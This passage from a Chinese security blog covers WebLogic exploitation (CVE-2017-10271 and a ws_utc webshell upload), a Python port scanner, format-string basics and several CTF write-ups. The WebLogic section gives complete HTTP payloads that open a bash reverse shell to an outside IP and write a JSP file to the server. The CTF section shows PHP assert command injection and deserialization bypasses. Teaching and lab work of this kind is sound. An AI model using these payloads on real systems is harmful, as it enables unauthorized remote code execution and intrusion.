<li><p>访问<code>http://192.168.2.154:7001/ws_utc/config.do</code>将<strong>Work Home Dir</strong>设置为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
</li>
<li><p>点击<strong>安全</strong>，添加中上传<strong>webshell</strong></p>
</li>
</ul>
<p><img src="/images/Weblogic/10.png" alt="10"></p>
<ul>
<li>观察返回数据包中的时间戳：</li>
</ul>
<p><img src="/images/Weblogic/11.png" alt="11"></p>
<ul>
<li>然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行<strong>webshell</strong></li>
</ul>
<p><img src="/images/Weblogic/12.png" alt="12"></p>
<h4 id="Weblogic-XMLDecoder-反序列化漏洞-（CVE-2017-10271）"><a href="#Weblogic-XMLDecoder-反序列化漏洞-（CVE-2017-10271）" class="headerlink" title="Weblogic XMLDecoder 反序列化漏洞 （CVE-2017-10271）"></a>Weblogic XMLDecoder 反序列化漏洞 （CVE-2017-10271）</h4><p><strong>Weblogic</strong>的<strong>WLS Security</strong>组件对外提供<strong>webservice</strong>服务，其中使用了<strong>XMLDecoder</strong>来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
<ul>
<li>访问<code>/wls-wsat/CoordinatorPortType</code>发送一下数据包</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.1.51:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/10.0.0.1/21 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>执行效果</strong></li>
</ul>
<p><img src="/images/Weblogic/13.png" alt="13"></p>
<p><strong>获取shell</strong></p>
<p><img src="/images/Weblogic/14.png" alt="14"></p>
<ul>
<li><strong>写入Webshell：</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 638</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print("test"); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问：<code>http://192.168.1.51:7001/bea_wls_internal/test.jsp</code></p>
<p>利用工具：<a href="https://github.com/hanc00l/weblogic_wls_wsat_rce" target="_blank" rel="noopener">https://github.com/hanc00l/weblogic_wls_wsat_rce</a></p>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
  </entry>
  <entry>
    <title>基于python3的端口扫描</title>
    <url>/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<ul>
<li>端口扫描原理：    </li>
</ul>
<p>尝试与目标主机建立连接，如果目标主机有回复则说明端口开放。（大多数扫描技术基于TCP实现）</p>
<ul>
<li>扫描分类：</li>
</ul>
<ol>
<li><p><strong>TCP connect扫描</strong></p>
<p>利用客户端与服务端建立 TCP 连接必须要进行三次握手，如果我们能够成功完成一次 TCP 三次握手，那么就说明目标端口是开放的。</p>
<p>若端口为开放状态，服务端就会收到一个SYN后返回SYN+ACK，此时只需要返回一个ACK+RST完成三次握手并重置连接即可。</p>
<a id="more"></a>

<p><img src="/images/portscan/1.jpg" alt="1"></p>
<p>若目标端口处于关闭状态，服务端则会返回RST重置连接。</p>
<p><img src="/images/portscan/2.jpg" alt="2"></p>
</li>
<li><p><strong>SYN 扫描</strong></p>
<p>这种技术通常认为是“半开放”扫描，如果目标端口开放时，只返回 <strong>RST</strong> 数据包，而不返回 <strong>ACK+RST</strong>（躲避防火墙的探测）</p>
<p><img src="/images/portscan/3.jpg" alt="3"></p>
</li>
<li><p><strong>TCP 空扫描(Null)</strong></p>
<p>数据包<strong>flags</strong>标识位全都不设置，若扫描主机是<code>windows</code>系统，不管端口开放情况，都会回复<strong>RST</strong>包。若扫描主机是<code>linux</code>系统，若端口开放，则不回复。 若端口关闭，则回复<strong>RST</strong>包。可以探测操作系统。<br><img src="/images/portscan/4.jpg" alt="4"></p>
<p><img src="/images/portscan/5.jpg" alt="5"></p>
<p><strong>如果收到ICMP数据包则说明被过滤</strong></p>
<p><img src="/images/portscan/6.jpg" alt="6"></p>
</li>
<li><p><strong>TCP Xmas Tree（圣诞树）扫描</strong></p>
<p> 圣诞树扫描的原理是，客户端向服务端发送带有<strong>PSH,FIN,URG</strong>标识和端口号的数据包，如果端口开放，则服务端不会有任何的响应。</p>
</li>
</ol>
<p>​    <img src="/images/portscan/7.jpg" alt="7"></p>
<p>  如果服务器返回一个<strong>RST</strong>数据包，则表明端口处于关闭状态。</p>
<p>​    <img src="/images/portscan/8.jpg" alt="8"></p>
<p>  同样的若收到返回的<strong>ICMP</strong>数据包则表明数据包被过滤。</p>
<ol start="5">
<li><p><strong>TCP Xmas Tree（圣诞树）扫描</strong></p>
<p><strong>TCP FIN</strong> 扫描类似于圣诞树扫描，只不过发送的是带有 <strong>FIN</strong> 标识和端口号的数据包给服务端，同样的，如果服务端没有任何响应，则说明端口处于开放状态（不论是否被防火墙过滤）如果服务端返回一个 RST 数据包，则说明端口处于关闭状态。同样的，如果收到返回的 ICMP 数据包则表明数据包被过滤。</p>
</li>
</ol>
<ol start="6">
<li><strong>TCP ACK扫描</strong></li>
</ol>
<p>使用TCP ACK扫描不能够确定端口的关闭或者开放，因为当发送给对方一个含有ACK表示的TCP报文的时候，无论端口是开放或者关闭，都返回含有RST标志的报文。所以不能使用TCP ACK扫描来确定端口是否开放或者关闭。但是可以利用它来扫描防火墙的配置，用它来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。</p>
<p><code>向服务端发送一个带有 ACK 标识的数据包，如果收到带有 RST 标识的响应，则说明服务端没有过滤，不存在状态防火墙。</code></p>
<p><img src="/images/portscan/9.jpg" alt="9"></p>
<ul>
<li><strong>使用Python3实现端口扫描</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portscan</span><span class="params">(ip,port,timeout)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		socket.setdefaulttimeout(timeout)</span><br><span class="line">		s=socket.socket()</span><br><span class="line">		s.connect((ip,port))</span><br><span class="line">		print(<span class="string">'[+] &#123;&#125; is open.'</span>.format(port))</span><br><span class="line">		s.close()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		print(<span class="string">'[-] &#123;&#125; is close.'</span>.format(port))</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,host,port,timeout)</span>:</span></span><br><span class="line">		super(MyThread,self).__init__()</span><br><span class="line">		self.host=host</span><br><span class="line">		self.port=port</span><br><span class="line">		self.timeout=timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">		portscan(self.host,self.port,self.timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	def_ports = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">80</span>,<span class="number">110</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">873</span>,<span class="number">888</span>,<span class="number">1025</span>,<span class="number">1433</span>,<span class="number">1521</span>,<span class="number">2082</span>,<span class="number">2083</span>,<span class="number">2222</span>,<span class="number">3306</span>,<span class="number">3311</span>,<span class="number">3312</span>,<span class="number">3389</span>,<span class="number">4899</span>,<span class="number">5432</span>,<span class="number">5900</span>,<span class="number">6379</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">7778</span>,<span class="number">8000</span>,<span class="number">8080</span>,<span class="number">8888</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">43958</span>,<span class="number">50000</span>,<span class="number">65500</span>]</span><br><span class="line"></span><br><span class="line">	parser=argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">'-a'</span>,help=<span class="string">'target host'</span>,dest=<span class="string">'host'</span>,required=<span class="literal">True</span>)</span><br><span class="line">	parser.add_argument(<span class="string">'-t'</span>,help=<span class="string">'timeout'</span>,dest=<span class="string">'timeout'</span>,type=int,required=<span class="literal">True</span>)</span><br><span class="line">	parser.add_argument(<span class="string">'-p'</span>,help=<span class="string">'target port'</span>,dest=<span class="string">'port'</span>,required=<span class="literal">False</span>)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	threads = []</span><br><span class="line">	<span class="keyword">if</span> args.port:</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'-'</span> <span class="keyword">in</span> args.port:</span><br><span class="line">			limits = args.port.split(<span class="string">'-'</span>)</span><br><span class="line">			limits = list(map(int,limits))</span><br><span class="line">			<span class="keyword">for</span> port <span class="keyword">in</span> range(limits[<span class="number">0</span>],limits[<span class="number">1</span>]+<span class="number">1</span>):</span><br><span class="line">				t = MyThread(args.host,port,args.timeout)</span><br><span class="line">				threads.append(t)</span><br><span class="line">	<span class="keyword">else</span>:	</span><br><span class="line">		<span class="keyword">for</span> port <span class="keyword">in</span> def_ports:</span><br><span class="line">			t = MyThread(args.host,port,args.timeout)</span><br><span class="line">			threads.append(t)</span><br><span class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">		t.start()</span><br><span class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">		t.join()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2019/05/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h4 id="Format-String介绍："><a href="#Format-String介绍：" class="headerlink" title="Format String介绍："></a>Format String介绍：</h4><p>在<strong>C</strong>语言中，常用的输出函数有<strong>printf,fprintf,vprintf,vfptintf,sprint</strong>等.对于这些输出函数，<strong>Format String</strong>是其第一个参数，一般称为格式化字符串。</p>
<p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化的字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为可读的字符串格式，几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。<br> <a id="more"></a></p>
<p>一般来说格式化字符串在利用的时候主要分为三个部分：</p>
<blockquote>
<p><strong>格式化字符串函数</strong></p>
<p><strong>格式化字串</strong></p>
<p><strong>后续参数（可选）</strong></p>
</blockquote>
<p><strong>在printf函数中：</strong></p>
<p><img src="/images/Format_string/1.png" alt="1"></p>
<h4 id="Format-String符号说明："><a href="#Format-String符号说明：" class="headerlink" title="Format String符号说明："></a>Format String符号说明：</h4><p>在格式化字符串中，”%s”,”%d”等类型的符号叫符号说明，这些符号说明的基本格式为<code>%[parameter][flags][field width][.precision][length]type</code></p>
<table>
<thead>
<tr>
<th align="left">符号</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%p</td>
<td>将对应参数解析为地址形式输出</td>
</tr>
<tr>
<td align="left">%k$p</td>
<td>将更改对应顺序，与格式化字符串后的第K个参数进行对应，并以地址形式解析参数值</td>
</tr>
<tr>
<td align="left">%k$n</td>
<td>将与格式化字符串后的第K个参数进行对应，将参数解析为第一个地址，并取消此次输出，而将已经输出的字节长度写入获取的地址</td>
</tr>
</tbody></table>
<h4 id="调用约定："><a href="#调用约定：" class="headerlink" title="调用约定："></a>调用约定：</h4><ul>
<li><strong>X86:</strong></li>
</ul>
<p>在<strong>32-bit</strong>系统中，print的参数是<strong>按参数顺序依次存放在栈上的</strong>.</p>
<p><strong>例如：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">![<span class="number">2</span>](C:\Users\<span class="number">52899</span>\Desktop\Format_string\<span class="number">2.</span>png)<span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Test: 1.%p\t 2.%p\t 3.%p\t 4.%p\t 5.%p\t 6.%p\t"</span>,<span class="number">0x11111111</span>,<span class="number">0x22222222</span>,<span class="number">0x33333333</span>,<span class="number">0x44444444</span>,<span class="number">0x5555555</span>,<span class="number">0x66666666</span>);</span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在栈中：</strong></p>
<p><img src="/images/Format_string/2.png" alt="2"></p>
<p><strong>Format String:</strong></p>
<p><img src="/images/Format_string/3.png" alt="3"></p>
<p>可以发现在32位调用<strong>printf</strong>时，栈从低到高依次存放指向格式化字符串的指针和变长参数。</p>
<ul>
<li><strong>X86-64:</strong></li>
</ul>
<p>在<strong>64-bi</strong>t的系统中，<strong>printf</strong>的调用约定与32-bit的不同，<strong>64</strong>位系统中前<strong>6</strong>个参数是存放在寄存器中的，前六个参数按顺序放在<strong>RDI</strong>(指向<strong>format string</strong> 的指针)，<strong>RSI.RDX,RCX,R8以及R9</strong>(前5个变长参数)寄存器中，其余的变长参数<strong>依次存放在栈</strong>上。</p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>部分CTF解题思路</title>
    <url>/2019/05/11/CTF_2/</url>
    <content><![CDATA[<h1 id="部分CTF思路"><a href="#部分CTF思路" class="headerlink" title="部分CTF思路"></a>部分CTF思路</h1><h4 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h4><p><img src="/images/ctf_2/1.jpg" alt="1"></p>
<a id="more"></a>
<p>这道题的思路比较简单，买彩票赚钱，有钱就可以购买flag</p>
<p>先访问robots.txt</p>
<p><img src="/images/ctf_2/2.jpg" alt="2"></p>
<p>有可能存在.git泄露，使用工具跑一下</p>
<p><img src="/images/ctf_2/3.jpg" alt="3"></p>
<p>利用工具下载源码，进行代码审计</p>
<p><img src="/images/ctf_2/4.jpg" alt="4"></p>
<p>代码中对number传入的参数没有判断，且使用<strong>==</strong>存在弱类型比较</p>
<blockquote>
<p>在PHP中遇到数字与字符串进行松散比较()时，会将字符串中前几位是数字且数字后面不是”.”，“e”或”E”的子串转化为数字，与数字进行比较，如果相同则返回为true，不同返回为false，后面的所有字符串直接截断扔掉。</p>
</blockquote>
<p>所以我们利用true让if的判断表达式返回值一直为真，最后修改发送请求的内容</p>
<p>构造<code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]}</code></p>
<p>利用burp发送数据</p>
<p><img src="/images/ctf_2/5.jpg" alt="5"></p>
<p>有足够的钱后购买flag</p>
<h4 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h4><p>首先打开网站，观察url<code>http://111.198.29.45:30457/?page=about</code>感觉像文件包含，但是发现使用../遍历目录时被过滤</p>
<ul>
<li>先扫一下目录</li>
</ul>
<p><img src="/images/ctf_2/6.jpg" alt="6"></p>
<p>发现存在.git目录，使用工具跑一下，得到源码</p>
<p><img src="/images/ctf_2/7.jpg" alt="7"></p>
<p>发现flag位于templates文件夹下，但是无法查看，可以查看到index.php</p>
<p><img src="/images/ctf_2/8.jpg" alt="8"></p>
<p>file经过过滤..()防止目录遍</p>
<p>发现该代码使用<code>assert</code>函数且<code>$file</code>变量是未经检查的用户输入创建的，即<code>$_GET[&#39;page&#39;]</code>,我们可以使用<code>$file</code>命令注入<code>assert</code>语句。</p>
<p><strong>assert()简介</strong>：</p>
<blockquote>
<p>判断一个表达式是否成立，返回true or false</p>
<p>当参数为字符串时，会被当作php代码执行</p>
<p>例如： assert(“phpinfo()”)  &lt;==&gt;  <?phpinfo()?></p>
</blockquote>
<p>所以我们可以通过可控变量<strong>file</strong>传入而已参数，构造闭合file_exists(),使assert()执行恶意代码</p>
<p><code>111.198.29.45:30457/?page=home%27).%20system(&quot;cat%20templates/flag.php&quot;);%20//</code></p>
<p><img src="/images/ctf_2/9.jpg" alt="9"></p>
<p><code>111.198.29.45:30457/?page=home%27).%20system(&quot;ls%20-lah%20templates&quot;);%20//</code></p>
<p><img src="/images/ctf_2/10.jpg" alt="10"></p>
<p><code>111.198.29.45:30457/?page=home%27).%20system(&quot;cat%20templates/flag.php&quot;);%20//</code></p>
<p><img src="/images/ctf_2/11.jpg" alt="11"></p>
<h4 id="unserilalize3"><a href="#unserilalize3" class="headerlink" title="unserilalize3"></a>unserilalize3</h4><p>该题目在页面直接给出了代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">exit(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p>在代码中定义了类<code>xctf</code>，并且有一个<code>flag</code>属性赋值为<code>111</code>,还有魔术变量<code>wake_up()</code></p>
<p><strong><code>wake_up()魔术方法：</code></strong><br><strong>unserialize()</strong> 会检查是否存在一个<strong>wake_up()</strong>方法。如果存在，则会先调用<strong>wake_up()</strong>方法，预先准备对象需要的资源。 </p>
<p><strong><code>wake_up()执行漏洞：</code></strong><br>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>wake_up()</code>的执行。即一个字符串或对象被序列化后，如果其属性被修改，则不会执行wake_up()函数.所以通过改变序列化后的属性的个数来构造<strong>payload</strong></p>
<p><img src="/images/ctf_2/12.jpg" alt="12"></p>
<p><strong>payload：</strong><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><img src="/images/ctf_2/13.jpg" alt="13"></p>
<h4 id="529"><a href="#529" class="headerlink" title="529"></a>529</h4><p>打开网页发现是一个购买类的网站，先注册，登陆后发现提示，只有购买5个商品后才能得到提示</p>
<p><img src="/images/ctf_2/14.jpg" alt="14"></p>
<p>每次新注册的用户只有1000积分，推荐一个人给100分，利用推荐的可拥有的最大积分为1300</p>
<ul>
<li><strong>利用条件竞争进行购买</strong></li>
</ul>
<p>在购买商品时发现，购买商品有明显的延时，可能是因为判断金额是否满足，所以可以利用条件竞争使多个进程同时通过金额判断，阻塞后在同一时间内付款，就可以导致非法购买商品，我们利用已有的1300积分，先购买3个商品，在购买第四个时，在俩个浏览器内同时进行购买。由于相同浏览器会对session进行限制，保证其在同一个进程请求）</p>
<p>再购买第五件商品后得到提示</p>
<p><img src="/images/ctf_2/15.jpg" alt="15"></p>
<ul>
<li><strong>SSRF读取任意文件</strong></li>
</ul>
<p>访问该链接，得到一个<strong>url</strong>请求页面，但是访问<strong>flag.php</strong>没有反应。</p>
<p>尝试使用<strong>file</strong>协议对<strong>flag.php</strong>进行读取得到<strong>Flag</strong></p>
<p><img src="/images/ctf_2/16.jpg" alt="16"></p>
<ul>
<li><strong>unset</strong></li>
</ul>
<p>题目一开始就给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>); <span class="comment">//对文件进行语法高亮显示</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;  <span class="comment">//foreach 用于遍历数组</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;     <span class="comment">//表示传入的键名中不能含有flag字符</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;  </span><br><span class="line">    <span class="comment">//将POST,GET,COOKIR三个变量依次赋值给$__R,若$__R中存在数据，则进行下一步</span></span><br><span class="line">        <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123;            <span class="comment">//取出$POST所对应的值的值</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k);   <span class="comment">//销毁指定的变量</span></span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line"><span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="comment">//extract的对象内的键名会成为一个新的变量，而这个新变量的值就是这个键名的值,后面的参数EXTR_SKIP避免了变量覆盖。extract函数会恢复我们unset的值，这样便可以实现对waf的完全绕过。</span></span><br><span class="line"><span class="comment">//extract()函数，此函数为变量注册函数，将数组中的数据以键名为变量名，键值为变量值的形式注册变量。</span></span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'daiker'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'daiker'</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题要读取flag.php，如果不绕过<strong>waf</strong>是无法读取的，所以通过<strong>POST</strong>一个特殊的内容来达到绕过的目的。</p>
<p>如果提前把<strong>_GET</strong>的内容给<strong>unset</strong>，就可以绕过<strong>waf</strong>，然后再通过<strong>extract</strong>函数给还原回来。</p>
<p>构造<strong>payload：</strong></p>
<p><img src="/images/ctf_2/17.jpg" alt="17"></p>
<p><strong>POST</strong>传过去的内容为<strong>_GET</strong>,所以执行<strong>unset($$__k)</strong>，<strong>$$__k</strong>即为<strong>get</strong>参数的值，而而<strong>$__V</strong>是<strong>POST</strong>传入数组里的键值的值。举例说这里都可以是<strong>QNKCDZO</strong>。之后我们就把<strong>_GET</strong>里的数组给<strong>unset</strong>掉了。</p>
<p>之后通过<code>if($_POST) extract($_POST, EXTR_SKIP);    if($_GET) extract($_GET, EXTR_SKIP);</code>将<strong>_GET</strong>给还原回来。达到绕过<strong>waf</strong>并读取<strong>flag.php</strong>的作用。*</p>
